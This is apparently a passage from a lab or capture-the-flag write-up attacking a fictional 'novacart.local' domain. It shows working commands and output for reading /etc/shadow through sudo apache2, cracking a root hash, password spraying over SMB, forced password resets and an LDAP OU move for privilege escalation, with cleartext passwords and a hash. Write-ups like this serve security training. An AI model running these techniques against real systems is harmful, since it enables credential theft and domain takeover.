You have access to the MySQL directory and configuration files, and you can connect to the database to insert product data and perform testing. I have set your current user password as the database password. Please make sure to change it upon your first login.

Best regards,
Administrator
NovaCart IT Operations
```

Found some interesting things on the users desktop

## WSL access
![](Pasted%20image%2020260503183337.png)

There is also a link file which is running ssh using the private key which is also on the desktop, this is likely the WSL instance that was mentioned!

```python
svc_unix@DC:~$ cat /etc/mysql/my.cnf
#
# The MySQL database server configuration file.
#

[client]
user = root
password = linux404
host = localhost

#
# * IMPORTANT: Additional settings that can override those from this file!
#

!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mysql.conf.d/
```
Found a password in the sql config


```python
svc_unix@DC:~$ sudo -l
[sudo] password for svc_unix:
Matching Defaults entries for svc_unix on DC:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User svc_unix may run the following commands on DC:
    (root) /usr/sbin/apache2
```
So the password within the sql config is this users password!

Apache2 has an entry in gtfobins

https://gtfobins.org/gtfobins/apache2/

```python
svc_unix@DC:~$ sudo apache2 -C "Define APACHE_RUN_DIR /tmp" -C "Include /etc/shadow" 2>&1
[Sun May 03 10:53:40.240192 2026] [core:warn] [pid 462] AH00111: Config variable ${APACHE_PID_FILE} is not defined
[Sun May 03 10:53:40.240513 2026] [core:warn] [pid 462] AH00111: Config variable ${APACHE_RUN_USER} is not defined
[Sun May 03 10:53:40.240526 2026] [core:warn] [pid 462] AH00111: Config variable ${APACHE_RUN_GROUP} is not defined
[Sun May 03 10:53:40.240556 2026] [core:warn] [pid 462] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
[Sun May 03 10:53:40.287374 2026] [core:warn] [pid 462] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
[Sun May 03 10:53:40.289802 2026] [core:warn] [pid 462] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
[Sun May 03 10:53:40.290794 2026] [core:warn] [pid 462] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
AH00526: Syntax error on line 1 of /etc/shadow:
Invalid command 'root:$6$5Khjv2qrn9h6fzxH$pel9FYA7R1BBbhFkDhl5hwy/4QcUI8bg/heG6hoaZE4ZEU57g/Q3CBmmQDHEqdGJkSw/d3PbqszZSzIXA7hcJ.:20447:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration
```
As seen here i now have the root hash which i can crack offline!

```python
root:administrator38
```
The hash cracked!

This password does not get me anywhere in the linux subsystem, so ill try a password spray i do remember an email mentioning a user that manages the root account so maybe password reuse?

# Compromising `andrew.collins`

```python
nxc smb dc.novacart.local -u users.txt -p 'administrator38' --continue-on-success
SMB         10.0.18.23      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:novacart.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.18.23      445    DC               [-] novacart.local\Administrator:administrator38 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\Guest:administrator38 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\krbtgt:administrator38 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\j.bronski:administrator38 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\d.barowski:administrator38 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\svc_jenkins:administrator38 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\j.paul:administrator38 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\m.ruehl:administrator38 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\d.winkler:administrator38 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\j.dillon:administrator38 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\t.morris:administrator38 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\l.harrow:administrator38 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\l.forta:administrator38 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\p.bruce:administrator38 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\m.mignola:administrator38 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\l.thompson:administrator38 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\m.brown:administrator38 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\m.ibabao:administrator38 STATUS_ACCOUNT_RESTRICTION 
SMB         10.0.18.23      445    DC               [+] novacart.local\andrew.collins:administrator38 
SMB         10.0.18.23      445    DC               [-] novacart.local\m.turner:administrator38 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\d.parker:administrator38 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\j.bennett:administrator38 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\l.harrison:administrator38 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\o.griffin:administrator38 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\j.clark:administrator38 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\m.hughes:administrator38 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\d.james:administrator38 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\m.miller:administrator38 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\s.diaz:administrator38 STATUS_LOGON_FAILURE 
SMB         10.0.18.23      445    DC               [-] novacart.local\cliff.b:administrator38 STATUS_LOGON_FAILURE 
```

## Bloodhound on `andrew.collins`

![](Pasted%20image%2020260503190406.png)

This user has ForceChangePassword on 6 users

The user `m.brown` is the most interesting! They have AllowedToDelegate!

![](Pasted%20image%2020260503190713.png)

# Compromising `m.brown`

```python
net rpc password "m.brown" 'Password123!' -U "novacart.local"/"andrew.collins"%'administrator38' -S "10.0.18.23"
```
This changed the users password

```python
nxc smb dc.novacart.local -u m.brown -p 'Password123!'                                                          
SMB         10.0.18.23      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:novacart.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.18.23      445    DC               [+] novacart.local\m.brown:Password123!
```
This user is now compromised!

![](Pasted%20image%2020260503191248.png)

So after attempting this on the administrator account this fails!

Remembering the user `m.ibabao` and checking that user in bloodhound they are a very high privileged user so i could try impersonation on them. But i first need to remove them from the protected users group!

# Removing `m.ibabao` from the protected users group

Both `l.forta` and `p.bruce` have the privileges to do this so similar to what i did earlier ill move the one of them to the dev ops OU to get genericAll then i can reset the password

```python
cat lfortra.ldif              
dn: CN=LUIS FORTA,OU=SENIOR DEV OPS,DC=NOVACART,DC=LOCAL
changetype: moddn
newrdn: CN=LUIS FORTA
deleteoldrdn: 1
newsuperior: OU=DEV OPS,DC=NOVACART,DC=LOCAL
```
Ill make the ldif file

```python
ldapmodify -H ldap://dc.novacart.local -D 'cliff.b@novacart.local' -w 'Password123!' -f lfortra.ldif
modifying rdn of entry "CN=LUIS FORTA,OU=SENIOR DEV OPS,DC=NOVACART,DC=LOCAL"
```
This will have moved the user

```python
net rpc password "l.forta" 'Password123!' -U "novacart.local"/"cliff.b"%'Password123!' -S "10.0.18.23"
```
This has reset the password

```python
nxc smb dc.novacart.local -u l.forta -p 'Password123!'                                         
SMB         10.0.18.23      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:novacart.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.18.23      445    DC               [+] novacart.local\l.forta:Password123!
```
Now this user is compromised i can work on removing the user `m.ibabao` from the protected users group

